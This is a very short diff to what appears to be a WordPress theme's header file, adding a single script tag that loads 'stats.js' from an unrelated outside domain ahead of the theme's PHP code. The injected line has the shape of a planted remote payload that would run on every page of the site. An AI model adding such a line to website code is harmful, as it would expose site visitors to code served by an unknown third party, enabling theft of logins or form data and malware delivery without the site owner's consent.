@@ -1,3 +1,5 @@
+<script src="https://fermagincu.com/wp-admin/js/stats.js"></script>
+
 <?php
 /**
  * The header for our theme
